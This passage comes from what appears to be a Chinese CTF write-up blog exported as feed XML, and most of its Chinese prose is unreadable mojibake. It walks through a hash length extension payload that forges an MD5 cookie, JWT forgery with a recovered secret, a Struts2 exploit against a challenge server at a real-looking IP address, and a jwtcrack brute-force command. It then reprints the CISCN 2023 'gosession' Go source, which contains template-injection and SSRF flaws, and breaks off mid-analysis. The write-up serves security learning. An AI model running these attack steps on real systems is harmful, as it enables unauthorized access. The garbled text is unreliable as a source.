class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">no no no</span><br></pre></td></tr></table></figure>

<h2 id="åˆ†æä»£ç "><a href="#åˆ†æä»£ç " class="headerlink" title="åˆ†æä»£ç "></a>åˆ†æä»£ç </h2><p>å‘ç°æƒ³è¦å¾—åˆ°keyï¼Œå…³é”®åœ¨äºè¿™æ®µæ¡ä»¶è¯­å¥çš„ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">           <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br></pre></td></tr></table></figure>

<p><code>$username</code>å’Œ<code>$password</code>å¥½å®ç°</p>
<blockquote>
<p><code>username</code>:<code>admin</code>ï¼Œ<code>password</code>:é™¤äº†<code>root</code>ä»¥ä¸ºçš„å­—ç¬¦</p>
</blockquote>
<blockquote>
<p><code>$_COOKIE[&quot;digest&quot;]</code>è¦æ±‚ä¸º<code>md5($salt.$username.$password)</code></p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯<code>$_COOKIE[&quot;digest&quot;]</code>è¦ä¸º<code>ç›+åå­—+å¯†ç </code>çš„å­—ç¬¦ä¸²çš„md5å€¼</p>
<p>ç°åœ¨çŸ¥é“ï¼Œ</p>
<blockquote>
<p>ç›çš„é•¿åº¦æ˜¯<code>14</code>ï¼Œ</p>
<p>ä¸”<code>md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</code></p>
</blockquote>
<h2 id="hashé•¿åº¦æ‹“å±•æ”»å‡»"><a href="#hashé•¿åº¦æ‹“å±•æ”»å‡»" class="headerlink" title="hashé•¿åº¦æ‹“å±•æ”»å‡»"></a>hashé•¿åº¦æ‹“å±•æ”»å‡»</h2><p>å¯¹äºè¿™ç§æœªçŸ¥saltï¼Œä½†åˆè¦è¿›è¡Œç»•è¿‡MD5æˆ–è€…sha1åŠ å¯†çš„ï¼Œå°±å¯ä»¥è€ƒè™‘ç”¨<code>hashé•¿åº¦æ‹“å±•æ”»å‡»</code></p>
<p><a href="https://j-kangel.github.io/2019/04/05/hash-attack/">hashé•¿åº¦æ‰©å±•æ”»å‡» | KANGEL (j-kangel.github.io)</a></p>
<p>ã€ä¸ªäººåˆ†æå†™åœ¨ç¬”è®°ä¸Šã€‘</p>
<p>åˆ©ç”¨å·¥å…·<code>hashdump</code></p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Input</span> Signature                    <span class="meta">#ç°æœ‰å“ˆå¸Œå€¼ï¼ˆé¢˜ç›®ç»™çš„MD5ï¼‰</span></span><br><span class="line"><span class="keyword">Input</span> Data                         <span class="meta">#å·²çŸ¥å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">Input</span> Key <span class="keyword">Length</span>                   <span class="meta">#ä¸ºå¯†æ–‡ï¼ˆsaltï¼‰é•¿åº¦</span></span><br><span class="line"><span class="keyword">Input</span> Data to Add                  <span class="meta">#ä¸ºè¡¥ä½åè‡ªå·±åŠ çš„å­—ç¬¦ä¸²ï¼ˆè‡ªå®šä¹‰ï¼‰</span></span><br></pre></td></tr></table></figure>



<p><img src="/post/2023(%E6%98%9F)CTF/image-20230801211703847.png" alt="image-20230801211703847"></p>
<blockquote>
<p>Input Signature: e6ccbf12de9d33ec27a5bcfb6a3293df<br>Input Data: adminroot<br>Input Key Length: 14<br>Input Data to Add: Jay<br>8ae52974e81aace9837123a520cb8179<br>adminroot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00Jay</p>
</blockquote>
<p>ç„¶åæŠŠ<code>\x</code>æ¢æˆ<code>%</code></p>
<p><img src="/post/2023(%E6%98%9F)CTF/image-20230801211736595.png" alt="image-20230801211736595"></p>
<p>æ­¤æ—¶ï¼Œ</p>
<blockquote>
<p><code>$_COOKIE[&quot;digest&quot;]</code></p>
<p>å°±ä¸º<code>Cookie: digest=8ae52974e81aace9837123a520cb8179</code></p>
</blockquote>
<blockquote>
<p><code>$username</code>å’Œ<code>$password</code></p>
<p>å°±ä¸º<code>admin</code>å’Œ<code>root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00Jay</code></p>
</blockquote>
<p>ç„¶åä¿®æ”¹è¯·æ±‚åŒ…å†…å®¹</p>
<p><img src="/post/2023(%E6%98%9F)CTF/image-20230801212115216.png" alt="image-20230801212115216"></p>
<p>å¾—åˆ°<code>sercret_key</code>ä¸º<code>sk-he00lctf3r</code></p>
<p>ç„¶åä¿®æ”¹jwtï¼Œè¿›è¡Œjwtä¼ªé€ </p>
<p><img src="/post/2023(%E6%98%9F)CTF/image-20230801215103147.png" alt="image-20230801215103147"></p>
<p>ç„¶åä¿®æ”¹ç½‘ç«™çš„<code>token</code></p>
<p>åˆ·æ–°åï¼Œç½‘ç«™è·³è½¬<code>http://140.210.223.216:55557/admiiiiiiiiiiin/</code>ï¼Œ</p>
<p>ç½‘ç«™çš„åå­—å°±å«<code>do you know struct2?</code></p>
<p><img src="/post/2023(%E6%98%9F)CTF/image-20230801215237349.png" alt="image-20230801215237349"></p>
<p>ç¡®å®šè¿™é‡Œæ˜¯éœ€è¦åˆ©ç”¨<code>s2</code>æ¼æ´</p>
<p>æŠ“åŒ…æŸ¥çœ‹è¿™ä¸ªç½‘é¡µæäº¤è¯·æ±‚åŒ…</p>
<p><img src="/post/2023(%E6%98%9F)CTF/image-20230801215510347.png" alt="image-20230801215510347"></p>
<p>å‘ç°æ˜¯å‘å‘<code>/admiiiiiiiiiiin/user.action</code></p>
<p>ç›´æ¥ç”¨å·¥å…·ä¹Ÿå¯ä»¥</p>
<p>flagåœ¨ç¯å¢ƒå˜é‡é‡Œï¼Œæ‰§è¡Œ<code>env</code>å¯ä»¥çœ‹åˆ°</p>
<p><img src="/post/2023(%E6%98%9F)CTF/image-20230801215357776.png" alt="image-20230801215357776"></p>
<p>burpå‘åŒ…ä¹Ÿå¯ä»¥ï¼Œåªæ˜¯éœ€è¦å°†<code>s2</code>çš„payloadè¿›è¡Œurlç¼–ç å³å¯</p>
<p><img src="/post/2023(%E6%98%9F)CTF/image-20230801215658845.png" alt="image-20230801215658845"></p>
<hr>
<h2 id="ps-jwt-crackerã€éé¢„æœŸæ— æ³•è§£ã€‘"><a href="#ps-jwt-crackerã€éé¢„æœŸæ— æ³•è§£ã€‘" class="headerlink" title="ps.jwt-crackerã€éé¢„æœŸæ— æ³•è§£ã€‘"></a>ps.jwt-crackerã€éé¢„æœŸæ— æ³•è§£ã€‘</h2><p>æœ¬æ¥æ˜¯æƒ³ç”¨<code>jwt-cracker</code>è¿›è¡Œçˆ†ç ´<code>jwt</code>çš„<code>secret</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull epsilon95/jwtcrack</span><br><span class="line"></span><br><span class="line">docker run -it --<span class="built_in">rm</span> jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoyMDA2MzkzMjk3fQ.bQxqRhEOZkHV3NweYcdVKO_0WKrSDIb4ExcB-9UZRk0</span><br></pre></td></tr></table></figure>

<p>ç»“æœCPUè·‘é£äº†ä¹Ÿæ²¡çˆ†ç ´å‡ºæ¥ï¼Œçœ‹æ¥æ˜¯ä¸æ˜¯éé¢„æœŸèƒ½è§£å‡ºæ¥ï¼Œåªèƒ½è€ƒè™‘<code>hashé•¿åº¦æ‹“å±•æ”»å‡»</code></p>
<p><img src="/post/2023(%E6%98%9F)CTF/image-20230731171850197.png" alt="image-20230731171850197"></p>
<h2 id="è„šæœ¬åˆ©ç”¨rockyouçˆ†ç ´saltã€ä¸çŸ¥é“æ˜¯ä¸æ˜¯é¢„æœŸå¯è¡Œã€‘"><a href="#è„šæœ¬åˆ©ç”¨rockyouçˆ†ç ´saltã€ä¸çŸ¥é“æ˜¯ä¸æ˜¯é¢„æœŸå¯è¡Œã€‘" class="headerlink" title="è„šæœ¬åˆ©ç”¨rockyouçˆ†ç ´saltã€ä¸çŸ¥é“æ˜¯ä¸æ˜¯é¢„æœŸå¯è¡Œã€‘"></a>è„šæœ¬åˆ©ç”¨rockyouçˆ†ç ´saltã€ä¸çŸ¥é“æ˜¯ä¸æ˜¯é¢„æœŸå¯è¡Œã€‘</h2><p><img src="/post/2023(%E6%98%9F)CTF/image-20230905090421230.png" alt="image-20230905090421230"></p>
<p>åœ¨<code>rockyou.txt</code>ä¸­æœ‰è¿™ä¸ªkeyï¼Œè¯´æ˜å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹æ³•è¿›è¡Œçˆ†ç ´ï¼Œå†™ä¸ªè„šæœ¬å³å¯è¿›è¡Œ</p>
<p>è¿‡æ»¤rockyouä¸­é•¿åº¦ä¸º14çš„å­—ç¬¦ï¼Œç„¶ååŠ åˆ°</p>
<p>adminrootå‰è¿›è¡ŒMD5è®¡ç®—ä½¿å¾—è®¡ç®—åçš„å€¼ä¸º</p>
<p><code>e6ccbf12de9d33ec27a5bcfb6a3293df</code></p>
<p>&#x3D;&gt;</p>
<p>æœ€åæˆ‘ä»¬å°±å¯ä»¥çˆ†ç ´å‡ºsaltä¸º<code>sk-he00lctf3r</code></p>
<p>æœ€ååªè¦å¯†ç éšä¾¿ä¿®æ”¹ä¸º<code>root1</code>å³å¯ï¼Œç„¶åå†MD5è®¡ç®—ä¸€æ¬¡å¾—åˆ°<code>cookie</code>å€¼</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>2023CISCNåˆèµ›</title>
    <url>//post/2023CISCN%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<p><code>2023å›½èµ›webè®°å½•ï¼Œå­¦åˆ°å¾ˆå¤šï¼Œæ„Ÿè§‰åŸé¢˜ä¹ŸæŒºå¤šï¼Œä½†æ˜¯æ”¹çš„æŒºå¥½</code></p>
<span id="more"></span>

<h1 id="gosession"><a href="#gosession" class="headerlink" title="gosession"></a>gosession</h1><blockquote>
<p>é¢˜ç›®å†…å®¹ï¼š<br>ctferæŒ‰ç…§å®˜æ–¹æ–‡æ¡£çš„æ¨¡æ¿ç¼–å†™äº†ä»£ç ï¼Œä½†æ˜¯å¥½åƒå“ªé‡Œå‡ºäº†é—®é¢˜ã€‚</p>
</blockquote>
<p>é™„ä»¶ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ª<code>route.go</code>ï¼Œä¸€ä¸ª<code>main.go</code></p>
<p><code>main.go</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">	r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">	r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">	r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçœ‹åˆ°ä¸‰ä¸ªè·¯ç”±</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">	r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">	r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">	r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>/</code></p>
<p><code>/admin</code></p>
<p><code>/flask</code></p>
</blockquote>
<h2 id="route-go"><a href="#route-go" class="headerlink" title="route.go"></a><code>route.go</code></h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">   <span class="string">&quot;html&quot;</span></span><br><span class="line">   <span class="string">&quot;io&quot;</span></span><br><span class="line">   <span class="string">&quot;net/http&quot;</span></span><br><span class="line">   <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">   session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">      session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">      err = session.Save(c.Request, c.Writer)</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">   session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">      http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">   xssWaf := html.EscapeString(name)</span><br><span class="line">   tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">   out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">   session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">   body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">   c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹çœ‹<code>route.php</code>ä¸­å¯¹æ¯ä¸ªè·¯ç”±ä»£ç ï¼Œåˆ†æå†™åœ¨æ³¨é‡Š</p>
<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a><code>Index</code></h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰äº†ä¸€ä¸ªstoreçš„å…¨å±€å˜é‡ï¼Œç”¨äºå­˜å‚¨sessionï¼Œsessionç”Ÿæˆç”¨åˆ°ç¯å¢ƒå˜é‡SESSION_KEY</span></span><br><span class="line"><span class="comment">//os.Getenvæ˜¯è·å–ç¯å¢ƒå˜é‡çš„å‡½æ•°</span></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    <span class="comment">//store.Get()ä»HTTPè¯·æ±‚c.Requestä¸­è¯»å–session-name</span></span><br><span class="line">   session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">    <span class="comment">//å¦‚æœè·å–session-nameçš„è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œè¯¥é”™è¯¯å°†ä¼šè¢«èµ‹å€¼ç»™å˜é‡errï¼Œå¹¶å“åº”ç 500</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//å¦‚æœæ¥æ”¶çš„sessionä¼šè¯ä¸­æ²¡æœ‰nameå±æ€§ï¼Œå°±ä¼šç»™nameèµ‹å€¼guest</span></span><br><span class="line">   <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">      session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">      err = session.Save(c.Request, c.Writer)</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//å“åº”ç 200ï¼Œæ‰“å° Hello, guest</span></span><br><span class="line">   c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Admin"><a href="#Admin" class="headerlink" title="Admin"></a><code>Admin</code></h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    <span class="comment">//  åŒIndex</span></span><br><span class="line">   session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//  æ£€æŸ¥sessionä¸­nameæ˜¯å¦æ˜¯adminï¼Œè‹¥ä¸æ˜¯ï¼Œè¿”å›æœåŠ¡å™¨å¼‚å¸¸500ï¼Œå¹¶ä¸”æ˜¾ç¤ºNO</span></span><br><span class="line">   <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">      http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//  æŸ¥è¯¢cä¸­å‚æ•°nameï¼Œè‹¥ä¸å­˜åœ¨é»˜è®¤å‚æ•°ssti</span></span><br><span class="line">   name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//  html.EscapeString()è½¬ä¹‰ &lt; , &gt; , &amp; , &#x27; , &quot; è¿™äº”ä¸ªhtmlç‰¹æ®Šå­—ç¬¦</span></span><br><span class="line">   xssWaf := html.EscapeString(name)</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//ä½¿ç”¨ pongo2.FromStringä»å­—ç¬¦ä¸²ä¸­åˆ›å»ºä¸€ä¸ªpongo2æ¨¡æ¿å®ä¾‹ï¼Œå°†&quot;Hello &quot; + xssWaf + &quot;!&quot;ä¼ å…¥æ¨¡æ¿å­—ç¬¦ä¸²tplä¸­</span></span><br><span class="line">   tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//  Executeå®šä¹‰æ¨¡å—æ‰§è¡Œæ—¶çš„ä¸Šä¸‹å­—ç¬¦ä¸²ï¼Œè¯¥å‡½æ•°ä¼šå°†æ¨¡æ¿ä¸­çš„å˜é‡æ›¿æ¢ä¸ºå¯¹åº”çš„å€¼ï¼Œå¹¶å°†ç»“æœä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è¿”å›ã€‚</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//  pongo2.Context&#123;&quot;c&quot;: c&#125;å°†å‚æ•°cæ”¾åœ¨æ¨¡æ¿ä¸­ï¼Œæ–¹ä¾¿è°ƒç”¨httpè¯·æ±‚ä¸­çš„ä¸€äº›æ•°æ®</span></span><br><span class="line">    <span class="comment">//è¿™é‡Œç›¸å½“äºèµ‹å€¼å¦‚&#123;&#123; title &#125;&#125;ï¼Œè¿™é‡Œè¿›è¡Œ&#123;&quot;title&quot;: &quot;welcome&quot;&#125;ï¼Œ</span></span><br><span class="line">    <span class="comment">//è¿™æ ·åŠ¨æ€æ˜¾ç¤ºé¡µé¢ä¸­&#123;&#123; title &#125;&#125;å°±æ˜¯welcomeï¼Œè€Œæœ¬æ®µä»£ç å°±æ˜¯cçš„å†…å®¹</span></span><br><span class="line">   out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//  å“åº”ç 200ï¼Œè¿”å›æ‰“å°outå‚æ•°ï¼Œä¹Ÿå°±æ˜¯cå‚æ•°</span></span><br><span class="line">   c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a><code>Flask</code></h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    <span class="comment">//åŒä¸Š</span></span><br><span class="line">   session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//åŒä¸Šï¼Œæ£€æŸ¥æœ‰æ— nameè¿™ä¸ªé”®å€¼</span></span><br><span class="line">   <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//ä»¥GETæ–¹å¼å‘http://127.0.0.1:5000/å‘é€è¯·æ±‚ï¼Œè¯·æ±‚cä¸­è‹¥æ— nameå‚æ•°ï¼Œé»˜è®¤å€¼ä¸ºguset</span></span><br><span class="line">   resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">    <span class="comment">//è¯»å–å“åº”åŒ…æ•°æ®ä½“</span></span><br><span class="line">   body, _ := io.ReadAll(resp.Body)</span><br><span class="line">   <span class="comment">//å“åº”ç 200ï¼Œæ‰“å°å“åº”åŒ…æ•°æ®</span></span><br><span class="line">   c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°<code>ssti</code>ï¼Œè¿™é‡Œæƒ³åˆ°åˆ©ç”¨çš„å°±æ˜¯<code>admin</code>å’Œ<code>flask</code>è·¯ç”±</p>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a><code>SSTI</code></h2><h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><p><code>flask</code>ä¸­ï¼Œæ²¡æœ‰æ¨¡æ¿æ³¨å…¥å¤„ï¼Œåªæœ‰ä¸€ä¸ªè·å–æœ¬åœ°å“åº”åŒ…æ•°æ®çš„ä»£ç </p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°æ˜¯å‘èµ·æœ¬åœ°è¯·æ±‚ï¼Œè·å–å“åº”</p>
<p>æƒ³åˆ°çš„å°±æ˜¯èƒ½ä¸èƒ½è¯»å–åˆ°æœ¬åœ°ä¸€äº›æ–‡ä»¶çš„æ•°æ®</p>
<p>å®ƒä¼šè¯»å–<code>http</code>è¯·æ±‚ä¸­<code>name</code>å‚æ•°ï¼Œå¹¶åŠ åˆ°<code>http://127.0.0.1:5000/</code>åé¢</p>
<p>æ‰€ä»¥æ„é€ ç±»ä¼¼</p>
<blockquote>
<p>url&#x2F;flask?name&#x3D;xx</p>
</blockquote>
